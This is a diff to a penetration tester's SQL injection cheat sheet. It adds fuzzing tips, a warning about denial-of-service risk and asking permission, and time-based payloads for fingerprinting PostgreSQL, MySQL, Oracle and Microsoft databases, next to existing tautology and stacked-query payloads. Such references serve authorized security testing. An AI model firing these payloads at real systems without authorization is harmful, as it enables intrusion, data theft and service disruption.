@@ -2,6 +2,11 @@
 !!! alert "note"
 	 Think outside the box for injectable parameters. Anything that could be passed to a db is worth testing against. ie UAs, cookies, etc…
 
+!!! alert "note"
+	when fuzzing for SQL injection, try 1. replacing valid data with payloads, 2. appending payloads to the end of valid data
+
+!!! alert "note"
+	Be very careful with SQL injection payloads, likely potential for DOS, ask for permission if you find something.
 ## Key Delimiters and Enclosures
 
 - `'`, `"`: Standard string delimiters. E.g., `' OR '1'='1`
@@ -20,7 +25,22 @@
     - Oracle: `'; dbms_lock.sleep(5);--`
     - PostgreSQL: `'; SELECT pg_sleep(5);--`
 - Out-of-Band: Through DNS or HTTP. E.g., DNS lookup triggered by SQL query.
-## Basic
+
+## Enumerate DB Type
+---
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+PostgreSQL: 	`SELECT pg_sleep(10)`
+MySQL: 	`SELECT SLEEP(10)`
+Oracle: 	`dbms_pipe.receive_message(('a'),10)`
+Microsoft: 	`WAITFOR DELAY '0:0:10'`
+## Automated
+---
+See [SQLMap](../../🧠%20Methodologies/😏%20Cheatsheets/SQLMap.md) cheat sheet
+
+## Cheat Sheet Per DB Type
+---
+### Basic
 **Logical or**
 ```Python
 ' OR 1=1-- -
